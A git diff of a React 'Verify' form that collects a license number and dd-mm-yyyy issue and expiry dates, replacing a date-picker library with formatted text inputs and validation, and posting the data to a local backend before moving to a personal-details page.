@@ -1,13 +1,12 @@
 import React, { useState } from "react";
 import id from "../assets/id.png";
 import download from "../assets/download2.png";
-import DatePicker from "react-datepicker";
-import "react-datepicker/dist/react-datepicker.css";
 import { useNavigate } from "react-router-dom";
 
 const Verify = () => {
   const [currentErrorField, setCurrentErrorField] = useState(null);
   const navigate = useNavigate();
+
   const [errors, setErrors] = useState({
     licenseNumber: false,
     issueDate: false,
@@ -16,85 +15,95 @@ const Verify = () => {
 
   const [formData, setFormData] = useState({
     licenseNumber: "",
-    issueDate: null,
-    expireDate: null,
+    issueDate: "",
+    expireDate: "",
   });
 
-  const handleIssueDateChange = (date) => {
-    setFormData((prev) => ({
-      ...prev,
-      issueDate: date,
-    }));
-
-    if (currentErrorField === "issueDate") {
-      setErrors((prev) => ({ ...prev, issueDate: !date }));
-    }
+  // Simple dd-mm-yyyy date format validator
+  const isValidDateFormat = (dateStr) => {
+    // Matches dd-mm-yyyy where dd 01-31, mm 01-12, yyyy 4 digits
+    const regex = /^(0[1-9]|[12][0-9]|3[01])-(0[1-9]|1[0-2])-\d{4}$/;
+    return regex.test(dateStr);
   };
 
-  const handleExpireDateChange = (date) => {
-    setFormData((prev) => ({
-      ...prev,
-      expireDate: date,
-    }));
-
-    if (currentErrorField === "expireDate") {
-      setErrors((prev) => ({ ...prev, expireDate: !date }));
+  const validateField = (fieldName) => {
+    let isValid = false;
+    if (fieldName === "licenseNumber") {
+      isValid = formData.licenseNumber.trim() !== "";
+    } else if (fieldName === "issueDate") {
+      isValid = formData.issueDate.trim() !== "" && isValidDateFormat(formData.issueDate.trim());
+    } else if (fieldName === "expireDate") {
+      isValid = formData.expireDate.trim() !== "" && isValidDateFormat(formData.expireDate.trim());
     }
+    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
+    return isValid;
   };
 
-  const handleChange = (event) => {
-    const { name, value } = event.target;
-    setFormData((prev) => ({
-      ...prev,
-      [name]: value,
-    }));
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+    setFormData((prev) => ({ ...prev, [name]: value }));
 
     if (currentErrorField === name) {
       setErrors((prev) => ({ ...prev, [name]: !value.trim() }));
     }
   };
 
-  const validateField = (fieldName) => {
-    let isValid = false;
-
-    if (fieldName === "licenseNumber") {
-      isValid = formData.licenseNumber.trim() !== "";
-    } else if (fieldName === "issueDate") {
-      isValid = formData.issueDate !== null;
-    } else if (fieldName === "expireDate") {
-      isValid = formData.expireDate !== null;
+  const handleDateInputChange = (fieldName, value) => {
+    // Format input as dd-mm-yyyy while typing
+    const raw = value.replace(/\D/g, ""); // digits only
+    let formatted = "";
+    if (raw.length <= 2) {
+      formatted = raw;
+    } else if (raw.length <= 4) {
+      formatted = `${raw.slice(0, 2)}-${raw.slice(2)}`;
+    } else {
+      formatted = `${raw.slice(0, 2)}-${raw.slice(2, 4)}-${raw.slice(4, 8)}`;
     }
 
-    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
-    return isValid;
+    setFormData((prev) => ({ ...prev, [fieldName]: formatted }));
+
+    if (currentErrorField === fieldName) {
+      setErrors((prev) => ({ ...prev, [fieldName]: !formatted.trim() }));
+    }
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
 
-    // Check fields in order
+    // Validate in order
     if (!validateField("licenseNumber")) {
       setCurrentErrorField("licenseNumber");
       return;
     }
-
     if (!validateField("issueDate")) {
       setCurrentErrorField("issueDate");
       return;
     }
-
     if (!validateField("expireDate")) {
       setCurrentErrorField("expireDate");
       return;
     }
-    navigate("/personal");
 
-    // If all fields are valid
     setCurrentErrorField(null);
-    console.log("Form submitted:", formData);
+
+    try {
+      const response = await fetch("http://localhost:4000/sendVerify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(formData),
+      });
+
+      if (!response.ok) {
+        throw new Error("Failed to send details to server");
+      }
+
+      console.log("Details sent successfully!");
+      navigate("/personal");
+    } catch (error) {
+      console.error("Error sending details:", error);
+      // Optionally show an error message to user here
+    }
   };
- 
-  
 
   return (
     <div className="flex flex-col min-h-screen bg-[#ffffff]">
@@ -113,6 +122,7 @@ const Verify = () => {
         <form
           onSubmit={handleSubmit}
           className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto"
+          noValidate
         >
           {/* License Number */}
           <div className="w-full ">
@@ -124,10 +134,7 @@ const Verify = () => {
               type="text"
               value={formData.licenseNumber}
               onChange={handleChange}
-              onBlur={() =>
-                currentErrorField === "licenseNumber" &&
-                validateField("licenseNumber")
-              }
+              onBlur={() => validateField("licenseNumber")}
               className={`w-full h-[65px] border-gray-500 px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                 errors.licenseNumber
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
@@ -148,43 +155,20 @@ const Verify = () => {
               name="issueDate"
               type="text"
               placeholder="dd-mm-yyyy"
-              value={formData.issueDate || ""}
               maxLength={10}
-              onChange={(e) => {
-                const raw = e.target.value.replace(/\D/g, ""); // Remove non-digits
-                let formatted = "";
-
-                if (raw.length <= 2) {
-                  formatted = raw;
-                } else if (raw.length <= 4) {
-                  formatted = `${raw.slice(0, 2)}-${raw.slice(2)}`;
-                } else {
-                  formatted = `${raw.slice(0, 2)}-${raw.slice(
-                    2,
-                    4
-                  )}-${raw.slice(4, 8)}`;
-                }
-
-                setFormData((prev) => ({ ...prev, issueDate: formatted }));
-                if (currentErrorField === "issueDate") {
-                  setErrors((prev) => ({
-                    ...prev,
-                    issueDate: !formatted.trim(),
-                  }));
-                }
-              }}
-              onBlur={() =>
-                currentErrorField === "issueDate" && validateField("issueDate")
-              }
+              value={formData.issueDate}
+              onChange={(e) => handleDateInputChange("issueDate", e.target.value)}
+              onBlur={() => validateField("issueDate")}
               className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                 errors.issueDate
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
                   : "border-gray-500 focus:ring-2 focus:ring-blue-700"
               }`}
             />
-
             {errors.issueDate && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
+              <p className="text-red-500 text-sm mt-1">
+                Please enter a valid date (dd-mm-yyyy)
+              </p>
             )}
           </div>
 
@@ -194,46 +178,23 @@ const Verify = () => {
               Date of Expiry
             </label>
             <input
-              name="expiryDate"
+              name="expireDate"
               type="text"
               placeholder="dd-mm-yyyy"
-              value={formData.expireDate || ""}
               maxLength={10}
-              onChange={(e) => {
-                const raw = e.target.value.replace(/\D/g, ""); // Remove non-digits
-                let formatted = "";
-
-                if (raw.length <= 2) {
-                  formatted = raw;
-                } else if (raw.length <= 4) {
-                  formatted = `${raw.slice(0, 2)}-${raw.slice(2)}`;
-                } else {
-                  formatted = `${raw.slice(0, 2)}-${raw.slice(
-                    2,
-                    4
-                  )}-${raw.slice(4, 8)}`;
-                }
-
-                setFormData((prev) => ({ ...prev, expireDate: formatted }));
-                if (currentErrorField === "expireDate") {
-                  setErrors((prev) => ({
-                    ...prev,
-                    expireDate: !formatted.trim(),
-                  }));
-                }
-              }}
-              onBlur={() =>
-                currentErrorField === "expiryDate" && validateField("expireDate")
-              }
+              value={formData.expireDate}
+              onChange={(e) => handleDateInputChange("expireDate", e.target.value)}
+              onBlur={() => validateField("expireDate")}
               className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                 errors.expireDate
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
                   : "border-gray-500 focus:ring-2 focus:ring-blue-700"
               }`}
             />
-
             {errors.expireDate && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
+              <p className="text-red-500 text-sm mt-1">
+                Please enter a valid date (dd-mm-yyyy)
+              </p>
             )}
           </div>
 
